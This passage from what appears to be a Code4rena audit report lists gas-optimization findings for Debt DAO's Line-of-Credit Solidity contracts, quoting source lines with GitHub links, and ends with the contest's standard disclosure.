ILineOfCredit(self.line).status() != LineLib.STATUS.REPAID // if repaid, skip;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L35\n\n```solidity\nFile: contracts/utils/LineFactoryLib.sol\n\n/// @audit spigot()\n48:           address s = address(SecuredLine(oldLine).spigot());\n\n/// @audit escrow()\n49:           address e = address(SecuredLine(oldLine).escrow());\n\n/// @audit swapTarget()\n50:           address payable st = SecuredLine(oldLine).swapTarget();\n\n/// @audit defaultRevenueSplit()\n51:           uint8 split = SecuredLine(oldLine).defaultRevenueSplit();\n\n/// @audit init()\n72:           if(SecuredLine(payable(line)).init() != LineLib.STATUS.ACTIVE) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L48\n\n```solidity\nFile: contracts/utils/LineLib.sol\n\n/// @audit safeTransfer()\n46:               IERC20(token).safeTransfer(receiver, amount);\n\n/// @audit transfer()\n48:               payable(receiver).transfer(amount);\n\n/// @audit safeTransferFrom()\n69:               IERC20(token).safeTransferFrom(sender, address(this), amount);\n\n/// @audit balanceOf()\n83:               IERC20(token).balanceOf(address(this)) :\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L46\n\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n/// @audit claimEscrow()\n73:           uint256 claimed = ISpigot(spigot).claimEscrow(claimToken);\n\n/// @audit approve()\n134:              IERC20(sellToken).approve(swapTarget, amount);\n\n/// @audit updateOwner()\n147:        require(ISpigot(spigot).updateOwner(newLine));\n\n/// @audit owner()\n153:        address owner_ = ISpigot(spigot).owner();\n\n/// @audit getSetting()\n170:          (uint8 split,, bytes4 transferFunc) = ISpigot(spigot).getSetting(revenueContract);\n\n/// @audit updateOwnerSplit()\n176:              return ISpigot(spigot).updateOwnerSplit(revenueContract, defaultSplit);\n\n/// @audit updateOwnerSplit()\n179:              return ISpigot(spigot).updateOwnerSplit(revenueContract, MAX_SPLIT);\n\n/// @audit updateOwner()\n196:            if(!ISpigot(spigot).updateOwner(to)) { revert ReleaseSpigotFailed(); }\n\n/// @audit updateOwner()\n201:            if(!ISpigot(spigot).updateOwner(to)) { revert ReleaseSpigotFailed(); }\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L73\n\n## [G&#x2011;05]  State variables should be cached in stack variables rather than re-reading them from storage\n\nThe instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n*There are 5 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n/// @audit count on line 499\n502:          if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }\n\n/// @audit ids on line 172\n180:              id = ids[i];\n\n/// @audit ids on line 201\n204:            id = ids[i];\n\n/// @audit ids on line 517\n521:              id = ids[i];\n\n/// @audit ids on line 532\n532:                  ids[i] = ids[nextQSpot];    // id put into old `p` position\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L502\n\n## [G&#x2011;06]  `internal` functions only called once can be inlined to save gas\n\nNot inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n*There are 4 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n167       function _updateOutstandingDebt()\n168           internal\n169:          returns (uint256 principal, uint256 interest)\n\n435       function _createCredit(\n436           address lender,\n437           address token,\n438           uint256 amount\n439       )\n440           internal\n441:          returns (bytes32 id)\n\n516:      function _sortIntoQ(bytes32 p) internal returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L167-L169\n\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n42        function _accrueInterest(\n43            bytes32 id,\n44            uint256 drawnBalance,\n45            uint256 facilityBalance\n46:       ) internal returns (uint256) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L42-L46\n\n## [G&#x2011;07]  Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement\n`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`\n\n*There are 3 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n/// @audit if-condition on line 120\n122:              unusedTokens[credit.token] -= repaid - newTokens;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L122\n\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n/// @audit if-condition on line 100\n101:            uint256 diff = oldClaimTokens - newClaimTokens;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L101\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n/// @audit if-condition on line 95\n96:               require(LineLib.sendOutTokenOrETH(token, self.treasury, claimed - escrowedAmount));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L96\n\n## [G&#x2011;08]  `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops\n\nThe `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**.\n\n*There are 6 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n179:          for (uint256 i; i < len; ++i) {\n\n203:          for (uint256 i; i < len; ++i) {\n\n520:          for (uint256 i; i <= lastSpot; ++i) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L179\n\n```solidity\nFile: contracts/utils/CreditListLib.sol\n\n23:         for(uint256 i; i < len; ++i) {\n\n51:           for(uint i = 1; i < len; ++i) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditListLib.sol#L23\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n57:           for (uint256 i; i < length; ++i) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L57\n\n## [G&#x2011;09]  `require()`/`revert()` strings longer than 32 bytes cost extra gas\n\nEach extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n26            require(\n27                msg.sender == lineContract,\n28                \"InterestRateCred: only line contract.\"\n29:           );\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L26-L29\n\n## [G&#x2011;10]  Optimize names to save gas\n\n`public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92).\n\n*There are 15 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n/// @audit init(), healthcheck(), counts(), declareInsolvent()\n16:   contract LineOfCredit is ILineOfCredit, MutualConsent {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L16\n\n```solidity\nFile: contracts/modules/credit/SecuredLine.sol\n\n/// @audit liquidate()\n11:   contract SecuredLine is SpigotedLine, EscrowedLine, ISecuredLine {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L11\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n/// @audit unused(), claimAndRepay(), useAndRepay(), claimAndTrade(), updateOwnerSplit(), addSpigot(), updateWhitelist(), releaseSpigot(), sweep()\n22:   contract SpigotedLine is ISpigotedLine, LineOfCredit, ReentrancyGuard {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L22\n\n```solidity\nFile: contracts/modules/escrow/Escrow.sol\n\n/// @audit isLiquidatable(), updateLine(), addCollateral(), enableCollateral(), releaseCollateral(), getCollateralRatio(), getCollateralValue(), liquidate()\n19:   contract Escrow is IEscrow {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L19\n\n```solidity\nFile: contracts/modules/factories/LineFactory.sol\n\n/// @audit deployEscrow(), deploySpigot(), deploySecuredLine(), deploySecuredLineWithConfig(), deploySecuredLineWithModules(), rolloverSecuredLine()\n9:    contract LineFactory is ILineFactory {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L9\n\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n/// @audit setRate()\n5:    contract InterestRateCredit is IInterestRateCredit {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L5\n\n```solidity\nFile: contracts/modules/oracle/Oracle.sol\n\n/// @audit getLatestAnswer()\n13:   contract Oracle is IOracle {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L13\n\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n/// @audit operator(), claimRevenue(), claimEscrow(), operate(), addSpigot(), removeSpigot(), updateOwnerSplit(), updateOwner(), updateOperator(), updateTreasury(), updateWhitelistedFunction(), getEscrowed(), isWhitelisted(), getSetting()\n16:   contract Spigot is ISpigot, ReentrancyGuard {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L16\n\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n/// @audit computeId(), getOutstandingDebt(), calculateValue(), create(), repay(), withdraw(), accrue()\n14:   library CreditLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L14\n\n```solidity\nFile: contracts/utils/CreditListLib.sol\n\n/// @audit removePosition(), stepQ()\n10:   library CreditListLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditListLib.sol#L10\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n/// @audit _getLatestCollateralRatio(), _getCollateralValue(), addCollateral(), enableCollateral(), releaseCollateral(), getCollateralRatio(), getCollateralValue(), liquidate(), isLiquidatable(), updateLine()\n21:   library EscrowLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L21\n\n```solidity\nFile: contracts/utils/LineFactoryLib.sol\n\n/// @audit rolloverSecuredLine(), transferModulesToLine(), deploySecuredLine()\n7:    library LineFactoryLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L7\n\n```solidity\nFile: contracts/utils/LineLib.sol\n\n/// @audit sendOutTokenOrETH(), receiveTokenOrETH(), getBalance()\n14:   library LineLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L14\n\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n/// @audit claimAndTrade(), trade(), rollover(), canDeclareInsolvent(), updateSplit(), releaseSpigot(), sweep()\n10:   library SpigotedLineLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L10\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n/// @audit _claimRevenue(), operate(), claimRevenue(), claimEscrow(), addSpigot(), removeSpigot(), updateOwnerSplit(), updateOwner(), updateOperator(), updateTreasury(), updateWhitelistedFunction(), getEscrowed(), isWhitelisted(), getSetting()\n23:   library SpigotLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L23\n\n## [G&#x2011;11]  Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead\n> When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\nEach operation involving a `uint8` costs an extra [**22-28 gas**](https://gist.github.com/IllIllI000/9388d20c70f9a4632eb3ca7836f54977) (depending on whether the other operand is also a variable of type `uint8`) as compared to ones involving `uint256`, due to the compiler having to clear the higher bits of the memory word before operating on the `uint8`, as well as the associated stack operations of doing so. Use a larger size then downcast where needed.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n/// @audit uint8 decimals\n140:            decimals = 18;\n\n/// @audit uint8 decimals\n145:            decimals = !passed ? 18 : abi.decode(result, (uint8));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L140\n\n## [G&#x2011;12]  Using `private` rather than `public` for constants, saves gas\n\nIf needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table.\n\n*There are 3 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n21:       uint256 public immutable deadline;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L21\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n32:       uint8 public immutable defaultRevenueSplit;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L32\n\n```solidity\nFile: contracts/modules/escrow/Escrow.sol\n\n24:       uint32 public immutable minimumCollateralRatio;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L24\n\n## [G&#x2011;13]  Inverting the condition of an `if`-`else`-statement wastes gas\n\nFlipping the `true` and `false` blocks instead saves ***[3 gas](https://gist.github.com/IllIllI000/44da6fbe9d12b9ab21af82f14add56b9)***.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n145:            decimals = !passed ? 18 : abi.decode(result, (uint8));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L145\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n122                   deposit.asset = !is4626\n123                       ? token\n124:                      : abi.decode(tokenAddrBytes, (address));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L122-L124\n\n## [G&#x2011;14]  `require()` or `revert()` statements that check input arguments should be at the top of the function\n\nChecks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (**2100 gas***) in a function that may ultimately revert in the unhappy case.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n/// @audit expensive op on line 324\n326:          require(amount <= credit.principal + credit.interestAccrued);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L326\n\n## [G&#x2011;15]  Use custom errors rather than `revert()`/`require()` strings to save gas\n\nCustom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n26            require(\n27                msg.sender == lineContract,\n28                \"InterestRateCred: only line contract.\"\n29:           );\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L26-L29\n\n## [G&#x2011;16]  Functions guaranteed to revert when called by normal users can be marked `payable`\n\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are \n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost.\n\n*There are 4 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n340       function borrow(bytes32 id, uint256 amount)\n341           external\n342           override\n343           whileActive\n344           onlyBorrower\n345:          returns (bool)\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L340-L345\n\n```solidity\nFile: contracts/modules/credit/SecuredLine.sol\n\n48      function rollover(address newLine)\n49        external\n50        onlyBorrower\n51        override\n52:       returns(bool)\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L48-L52\n\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n34        function accrueInterest(\n35            bytes32 id,\n36            uint256 drawnBalance,\n37            uint256 facilityBalance\n38:       ) external override onlyLineContract returns (uint256) {\n\n74        function setRate(\n75            bytes32 id,\n76            uint128 dRate,\n77            uint128 fRate\n78:       ) external onlyLineContract returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L34-L38\n\n___\n\n## Excluded findings\nThese findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness\n\n## Gas Optimizations Summary\n| |Issue|Instances|Total Gas Saved|\n|-|:-|:-:|:-:|\n| [G&#x2011;17] | Using `bool`s for storage incurs overhead | 1 | 17100 |\n| [G&#x2011;18] | Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement | 3 | 18 |\n\nTotal: 4 instances over 2 issues with **17118 gas** saved\n\nGas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.\n\n## [G&#x2011;17]  Using `bool`s for storage incurs overhead\n```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\nUse `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/utils/MutualConsent.sol\n\n/// @audit (valid but excluded finding)\n15:       mapping(bytes32 => bool) public mutualConsents;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L15\n\n## [G&#x2011;18]  Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement\nThis change saves **[6 gas](https://aws1.discourse-cdn.com/business6/uploads/zeppelin/original/2X/3/363a367d6d68851f27d2679d10706cd16d788b96.png)** per instance. The optimization works until solidity version [0.8.13](https://gist.github.com/IllIllI000/bf2c3120f24a69e489f12b3213c06c94) where there is a regression in gas costs.\n\n*There are 3 instances of this issue:*\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n/// @audit (valid but excluded finding)\n91:           require(amount > 0);\n\n/// @audit (valid but excluded finding)\n161:          require(amount > 0);\n\n/// @audit (valid but excluded finding)\n198:          require(amount > 0);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L91\n\n\n\n***\n\n# Disclosures\n\nC4 is an open organization governed by participants in the community.\n\nC4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\n\nC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\n"
}